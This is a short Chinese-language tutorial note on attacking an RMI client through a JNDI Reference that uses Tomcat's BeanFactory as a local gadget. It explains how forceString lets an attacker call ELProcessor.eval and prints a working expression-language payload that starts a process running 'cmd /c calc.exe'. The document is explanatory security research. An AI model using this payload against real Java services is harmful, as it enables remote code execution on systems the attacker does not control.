### RMI Server Attack Client 方法三之 Reference Local Gadget

#### 原理 

在使用 `javax.naming.Reference` 恢复的过程中，会判断 `factory` 在本地是否存在，如果存在的话，会调用 `factory.getObjectInstance` 方法。

`org.apache.naming.factory.BeanFactory` 在 `getObjectInstance()` 中会通过反射的方式实例化`Reference`所指向的任意Bean Class，并且会调用`setter`方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于`Reference`对象，均是攻击者可控的。

并且在 `org.apache.naming.factory.BeanFactory` 可以通过 `forceString` 指定方法名（这里将 `xxx` 指定为 `eval` 方法）

```java
new StringRefAddr("forceString", "xxx=eval")
```

执行任意只有单个参数且为`String`类型的方法。

最终执行的是 `javax.el.ELProcessor.eval()` 方法：

```java
new ELProcessor.eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc.exe']).start()\")");
```